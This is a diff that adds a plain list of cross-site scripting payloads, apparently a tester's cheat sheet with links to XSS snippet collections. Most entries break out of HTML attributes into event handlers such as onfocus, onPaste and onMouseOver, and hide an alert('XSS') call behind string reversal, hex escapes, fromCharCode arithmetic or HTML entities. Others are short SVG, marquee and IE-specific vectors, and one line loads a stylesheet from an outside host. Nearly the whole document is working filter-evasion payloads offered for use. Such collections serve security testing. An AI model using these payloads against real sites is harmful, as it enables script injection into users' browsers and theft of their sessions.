@@ -1,0 +1,38 @@
+"onPaste="eval(';)\'SSX\'(trela'.split('').reverse().join(''))"
+"><link rel="stylesheet" href="http://8ant.org/asdfqwer.css"><"
+"onfocusin="top['\x61\x6C\x65\x72\x74']('\x58\x53\x53')"
+"onfocusout="parent[String.fromCharCode(500-403,500-392,500-399,500-386,500-384)](String.fromCharCode(300-212,300-217,300-217))"
+"onfocus="window['\141\154\145\162\164']('\130\123\123')"
+"onKeyDown="&#00112;arent['aleraaaaat'.replace('aaaaa','')]('XaaaaaSaaaaaS'.replace('aaaaa','').replace('aaaaa',''))"
+"onDblClick="&#119;indow['aleraaaat'.re&#0112;lace('aaaa','')]('XaaaaSaaaaS'.re&#0112;lace('aaaa','').re&#0112;lace('aaaa',''))"
+"onMouseUp="wi&#110dow[Str&#105;ng.fromC&#104;arCode(501-404,501-393,501-400,501-387,501-385)]&#0000040;&#0000039;&#0000088;&#0000083;&#0000083;&#0000039;&#0000041;"
+"onMouseEnter="&#000097;&#0000108;&#0000101;&#0000114;&#0000116;&#000040;&#000039;&#000088;&#000083;&#000083;&#000039;&#000041;"
+"onMouseDown="&#00097;&#000108;&#000101;&#000114;&#000116;&#00040;&#00039;&#00088;&#00083;&#00083;&#00039;&#00041;"
+"onMouseOut="&#0097;&#00108;&#00101;&#00114;&#00116;&#0040;&#0039;&#0088;&#0083;&#0083;&#0039;&#0041;"
+"onMouseMove="&#097;&#0108;&#0101;&#0114;&#0116;&#040;&#039;&#088;&#083;&#083;&#039;&#041;"
+"onMouseLeave="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"
+"onContextMenu="&#x000061;&#x00006c;&#x000065;&#x000072;&#x000074;&#x000028;&#x000027;&#x000058;&#x000053;&#x000053;&#x000027;&#x000029;"
+"onCopy="&#x00061;&#x0006c;&#x00065;&#x00072;&#x00074;&#x00028;&#x00027;&#x00058;&#x00053;&#x00053;&#x00027;&#x00029;"
+"onSelect="&#x0061;&#x006c;&#x0065;&#x0072;&#x0074;&#x0028;&#x0027;&#x0058;&#x0053;&#x0053;&#x0027;&#x0029;"
+"onBlur="&#x061;&#x06c;&#x065;&#x072;&#x074;&#x028;&#x027;&#x058;&#x053;&#x053;&#x027;&#x029;"
+"onmouseover="(new	Function('rssseturn(alesssrt)'.&#x73plit('sss').joi&#x6e('')))()(('SXS'+'SXS').slice(-5,4))"
+"onclick="alert('XSS')"
+"><script src="file:///c:/wonderful.js"></script><"
+
+
+Linkler:
+http://www.cnblogs.com/hustskyking/p/xss-snippets.html
+https://github.com/evilcos/xss.swf
+https://github.com/client9/libinjection/tree/master/data
+
+XSS:
+<script/src=data:,alert()>
+<marquee/onstart=alert()>
+<video/poster/onerror=alert()>
+<isindex/autofocus/onfocus=alert()>
+<svg id=alert(1337) onload=eval(id)>
+<svg id=javascript:alert(1337) onload=location=id>
+
+IE vektor :
+<style onload='execScript("InputBox+1","VbScript");'>
+<a onhelp='eval(href+"confirm(1)")'contenteditable='true'href='&#32;javascript:'>click</a>
